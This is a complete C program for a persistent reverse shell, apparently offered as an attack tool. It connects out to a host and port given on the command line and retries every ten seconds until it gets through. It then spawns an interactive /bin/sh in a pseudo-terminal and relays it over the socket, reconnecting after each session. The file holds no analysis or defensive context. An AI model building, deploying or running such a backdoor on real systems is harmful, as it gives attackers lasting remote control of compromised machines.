//#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/types.h>   //old UNIX flag must be add sys/types.h before /sys header files
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <string.h>
#include <pty.h>
#include <utmp.h>
#include <errno.h>

#define MAXBUF 1024

int connectback(char *host, u_short port)
{
	int     sock  = socket(AF_INET, SOCK_STREAM, 0);
	struct  sockaddr_in s;
	s.sin_family = AF_INET;
	s.sin_port = htons(port);
	s.sin_addr.s_addr = inet_addr(host);
	if(connect(sock, (struct sockaddr *)&s, sizeof(struct sockaddr_in)) == 0)
		return sock;
	printf("connect faild: %s\r\n", strerror(errno));
	return -1;
}

int swap(int sockfd, int master)
{
	int epfd, nfds, nb;
	struct epoll_event ev[2], events[5];
	unsigned char buf[MAXBUF];
	
	epfd = epoll_create(2);
	ev[0].data.fd = sockfd;
	ev[0].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev[0]);
	
	ev[1].data.fd = master;
	ev[1].events = EPOLLIN | EPOLLET;
	epoll_ctl(epfd, EPOLL_CTL_ADD, master, &ev[1]);
	
	for(;;)
	{
		nfds = epoll_wait(epfd, events, 5, -1);
		int i;
		for(i = 0;i < nfds; i ++)
		{
			if(events[i].data.fd == sockfd)
			{
				nb = read(sockfd, buf, MAXBUF);
				if(!nb)
					goto __LABEL_EXIT;
				write(master, buf, nb);
			}
			if(events[i].data.fd == master)
			{
				nb = read(master, buf, MAXBUF);
				if(!nb)
					goto __LABEL_EXIT;
				write(sockfd, buf, nb);
			}
		}
	}
	__LABEL_EXIT:
		close(sockfd);
		close(master);
		close(epfd);
	
	return 0;
}

void sig_child(int signo)
{
	int status;
	pid_t pid = wait(&status);
	printf("child %d terminated.\r\n", pid);
	exit(0);
}
int main(int argc, char* argv[])
{
	char ptsname[32] = {0};
	pid_t pid  = -1; 
	int master = -1;
	u_short port  = (u_short) atoi(argv[2]);
	char*   host  = argv[1];
	int sockfd = -1;
	
	if(argc != 3)
		return printf("%s <host> <port>\r\n", argv[0]);
	while(1){	
		sockfd = connectback(host, port);
		while(sockfd < 0){
			sleep(10);
			sockfd = connectback(host, port);
		}
		pid = fork();
		if(pid > 0) {
			printf("PARENT process waits until the shell process is finished\n");
			wait(NULL);
		}
		if(pid == 0) {
			signal(SIGCHLD, sig_child);
			pid = forkpty(&master, ptsname, NULL, NULL);
			if(pid == 0) {
				execlp("/bin/sh", "-i", NULL);
			}
			dup2(sockfd, 0);
			dup2(sockfd, 1);
			dup2(sockfd, 2);
			swap(sockfd, master);
		}
	}
	return 0;
}
